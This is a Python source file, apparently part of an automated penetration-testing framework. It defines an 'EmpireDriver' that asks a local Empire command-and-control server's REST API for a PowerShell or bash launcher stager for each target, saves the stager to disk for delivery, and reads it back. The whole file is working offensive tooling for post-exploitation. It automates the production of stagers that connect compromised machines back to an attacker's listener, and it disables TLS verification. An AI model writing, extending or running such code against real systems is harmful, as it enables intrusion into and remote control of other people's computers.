# modules/drivers/post_exploit/empire_driver.py

import os
import requests
from urllib.parse import urljoin
from modules.core.driver import BaseToolDriver, DriverResult, ParsedResult

class EmpireDriver(BaseToolDriver):
    """
    Driver for Empire post-exploitation via its REST API.
    Generates a bash stager, saves it for delivery, and parses it.
    """
    name = "post"

    def __init__(self, config, session_mgr, logger):
        super().__init__(config, session_mgr, logger)
        self.api_url = config.get("empire_api_url", "http://127.0.0.1:1337/api/v2").rstrip("/")
        self.token = config["empire_api_token"]
        self.listener = config.get("empire_listener", "http")
        self.outdir = config.get("empire_output_dir", "results/raw/empire")
        os.makedirs(self.outdir, exist_ok=True)

    def run(self, target: str, **kwargs) -> DriverResult:
        headers = {"Authorization": f"Bearer {self.token}"}
        # Pick template based on your needs, e.g. "multi_sh" for Bash, "multi_launcher" for PowerShell, etc.
        payload = {
            "name": f"autostager_{target.replace('://', '_').replace('/', '_')}",
            "template": "multi_launcher",  # or "multi_sh", "multi_powershell"
            "options": {
                "Listener": self.listener,
                "Language": "powershell",  # or "bash" if using "multi_sh"
                "UserAgent": "default",
                "SafeChecks": "True",
                # Optional: fill out other required options or use Empire defaults
            },
            "save": False  # don't save to Empire DB, just return the launcher
        }

        url = urljoin(self.api_url + "/", "stagers/")
        try:
            self.logger.info(f"[EmpireDriver] Requesting stager '{payload['template']}' for listener '{self.listener}'", extra={"target": target})
            resp = requests.post(url, headers=headers, json=payload, timeout=30, verify=False)
            resp.raise_for_status()
        except requests.RequestException as e:
            self.logger.error(f"[EmpireDriver] API error: {e}")
            return DriverResult(raw_output=None)

        results = resp.json().get("results", {})
        launcher = results.get("launcher") or results.get("Launcher")
        if not launcher:
            self.logger.error("[EmpireDriver] No launcher in stager response")
            return DriverResult(raw_output=None)

        safe = target.replace("://", "_").replace("/", "_")
        out_file = os.path.join(self.outdir, f"{safe}.sh")
        with open(out_file, "w") as f:
            f.write(launcher)
        self.logger.info(f"[EmpireDriver] Stager saved to {out_file}", extra={"target": target})

        return DriverResult(raw_output=out_file)


    def parse(self, raw_output_path: str) -> ParsedResult:
        """
        Reads the saved launcher script and returns it as parsed data.
        """
        try:
            with open(raw_output_path) as f:
                content = f.read()
        except Exception as e:
            self.logger.warning(f"[EmpireDriver] Cannot read {raw_output_path}: {e}")
            return ParsedResult(data={})
        return ParsedResult(data={"launcher": content})
